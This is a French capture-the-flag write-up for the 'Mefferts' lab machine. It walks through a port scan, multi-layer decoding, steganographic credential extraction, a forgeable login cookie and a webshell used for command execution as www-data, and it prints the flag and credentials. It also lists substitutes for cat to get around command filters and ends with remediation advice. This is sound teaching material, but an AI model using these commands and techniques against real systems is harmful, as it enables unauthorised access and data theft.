Mefferts

Catégorie : Cracking / Encodage / Stéganographie / RCE Cible : 10.10.0.5 Difficulté : Medium Objectif : Lire user.txt Flag : EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}

Vue d'ensemble
Recon (nmap : ports inversés 22=HTTP, 80=SSH)
      ▼
Source HTML → Base64 (backup passwd) + commentaire multi-encodé (Base64→Base32→Hex)
      │  indice : "the cubes are the keys to everything"
      ▼
Stéganographie steghide sur cube_gold.jpg (passphrase = backup passwd)
      │  → identifiants de Uwe
      ▼
recovery.php (POST des creds) → cookie login=uwe:... (contrôle d'accès cassé)
      ▼
Zone cachée /my_very_secret_dir/index.php → webshell ?cmd= → RCE www-data
      ▼
Lecture de user.txt (strings comme substitut à cat)

Techniques : énumération, lecture du source HTML, décodage multi-couches (Base64/Base32/Hex), stéganographie, contournement d'authentification (cookie non signé), RCE via webshell. Outils : nmap, curl, gobuster, base64, base32, xxd, steghide, zsteg.

1. Reconnaissance réseau
bash
nmap -sC -sV 10.10.0.5
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.68 ((Debian))     ← HTTP sur le port 22
80/tcp open  ssh     OpenSSH 10.0p2 Debian              ← SSH sur le port 80

Piège clé : les services sont inversés. Le port 22 (normalement SSH) sert du HTTP ; le port 80 (normalement HTTP) fait tourner SSH. Ne jamais se fier au numéro de port — c'est -sV qui donne la vérité. Tout le web se joue donc sur http://10.10.0.5:22.

2. Analyse du site + indices encodés
bash
curl -s http://10.10.0.5:22/

Le site « HK Now Store! » (boutique de Rubik's cubes). Dans le source, deux commentaires HTML cachés :

un renvoi vers /recovery.php ;
une chaîne Base64 :
bash
echo 'VGhlIGJhY2t1cCBwYXNzd2Q...' | base64 -d
# → The backup passwd is here, use it in last resort ... : 5Uch_4_G3n1u5_cR34ToR

Mot de passe de secours : 5Uch_4_G3n1u5_cR34ToR (Base64 = encodage, pas chiffrement : réversible sans clé).

2.1 recovery.php et le commentaire triple-encodé
bash
curl -s -i http://10.10.0.5:22/recovery.php

La page accueille « Hello Uwe! » et contient un commentaire encodé sur trois couches. On les retire dans l'ordre, en reconnaissant chaque encodage à son alphabet :

bash
echo 'R1U0VE1aUlhH...' | base64 -d      # → chaîne Base32 (A-Z, 2-7)
echo 'GU4TMZRXGUZD...' | base32 -d      # → chaîne hexadécimale (0-9, a-f)
echo '596f7520666f...' | xxd -r -p      # → texte clair

Résultat : « You forgot again didnt you? remember: the cubes are the keys to everything ».

→ Les images de cubes du site cachent des données (stéganographie).

Comment deviner l'ordre des couches : Base32 = uniquement A-Z et 2-7 ; hexadécimal = uniquement 0-9 et a-f (longueur paire). Le format de sortie indique le décodeur suivant.

3. Stéganographie sur les cubes

Téléchargement des 5 images et test avec steghide (passphrase = le backup passwd de l'étape 2) :

bash
cd ~/mefferts
for c in barrel ghost gold max void; do
  curl -s -o cube_$c.jpg "http://10.10.0.5:22/assets/cube_$c.jpg"
done
for c in barrel ghost gold max void; do
  echo "=== cube_$c ==="
  steghide extract -sf cube_$c.jpg -p '5Uch_4_G3n1u5_cR34ToR' -xf out_$c.txt
done

Seule cube_gold.jpg répond positivement :

wrote extracted data to "out_gold.txt".
bash
cat out_gold.txt
From me to myself, Uwe, please try to remember your password!
Username: uweThePuzzleMaster
Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35

steghide cache un fichier dans les coefficients d'une image JPEG, protégé par une passphrase. C'est pourquoi strings ne voit rien (données réparties + chiffrées). Note : steghide gère JPG/BMP/WAV/AU — pour du PNG il faut zsteg/stegsolve.

(Fausse piste documentée : header.png contient un champ EXIF « Raw profile type » qui n'est qu'une vignette JPEG standard, pas un secret. Les 4 autres cubes ne cachent rien.)

4. Contournement d'authentification via recovery.php

On soumet les identifiants au formulaire recovery.php (POST) :

bash
curl -s -i -X POST "http://10.10.0.5:22/recovery.php" \
  --data-urlencode "user=uweThePuzzleMaster" \
  --data-urlencode "pass=i_W4N7_70_C0Ll3C7_4Ll_Pu22l35"
HTTP/1.1 302 Found
Set-Cookie: login=uwe%3Athisisnotevennecessary; ...
location: /my_very_secret_dir/index.php

Faille : le cookie login=uwe:thisisnotevennecessary est non signé et prévisible — l'accès à la zone cachée repose uniquement sur sa présence, le mot de passe n'est pas revérifié (le suffixe « thisisnotevennecessary » le dit littéralement). C'est du broken access control : le cookie pourrait être forgé sans connaître le mot de passe.

(À noter : SSH sur le port 80 avec ces identifiants ne fonctionne pas — testé avec hydra, 0 combinaison valide. Le chemin est web, pas SSH.)

5. Zone cachée → RCE (webshell)
bash
IP=10.10.0.5
SH="http://$IP:22/my_very_secret_dir/index.php"
C='login=uwe:thisisnotevennecessary'

curl -s -b "$C" "$SH"
<h1>Secret Page, don't share!</h1>
<p>GET me a cmd and we'll talk!</p>

La page attend un paramètre cmd en GET → webshell. Exécution de commande :

bash
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmée en tant que www-data.

6. Lecture du flag

Énumération et lecture. Si cat est indisponible/filtré, on utilise un substitut (strings) :

bash
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=ls -la /home/uwe"
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=cat /home/uwe/user.txt"
# substitut si cat échoue :
curl -s -b "$C" -G "$SH" --data-urlencode "cmd=strings /home/uwe/user.txt"
EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}

Substituts à cat : strings, nl, od, tac, head, less savent tous afficher un fichier — utile quand cat est bloqué.

7. Concepts clés
Concept	Explication
Ports inversés	Se fier au service détecté par -sV, jamais au numéro de port.
Encodage ≠ chiffrement	Base64/Base32/Hex sont réversibles sans clé ; reconnaître chacun à son alphabet.
Ordre des couches	La sortie de chaque décodage indique l'encodage suivant (alphabet).
Stéganographie	steghide = données cachées dans JPG/BMP/WAV, protégées par passphrase (PNG → zsteg).
Broken access control	Cookie login= non signé et prévisible → accès sans vérif du mot de passe.
Webshell / RCE	system($_GET['cmd']) exécute des commandes en www-data.
Substituts à cat	strings, nl, od... lisent un fichier quand cat est indisponible.
8. Recommandations de remédiation
Indices dans le source / assets : ne jamais laisser de secrets (même encodés) dans le HTML, les commentaires ou les métadonnées d'images. L'encodage n'est pas du chiffrement.
Contrôle d'accès : ne jamais baser une session sur un cookie non signé et devinable. Utiliser des jetons de session signés/aléatoires côté serveur et revérifier l'autorisation à chaque page.
Upload / pages sensibles : aucune page ne doit exposer system($_GET['cmd']). Supprimer les webshells et endpoints de debug.
Stéganographie : ne pas se reposer sur l'obscurité (cacher un mot de passe dans une image) comme mécanisme de sécurité.
9. Résumé de la chaîne
nmap (ports inversés : 22=HTTP, 80=SSH)
  → source HTML : Base64 → backup passwd + /recovery.php
  → recovery.php : Base64→Base32→Hex → "the cubes are the keys"
  → steghide sur cube_gold.jpg → creds uweThePuzzleMaster
  → POST recovery.php → cookie login=uwe:... (broken access control)
  → /my_very_secret_dir/index.php (webshell ?cmd=) → RCE www-data
  → strings /home/uwe/user.txt → FLAG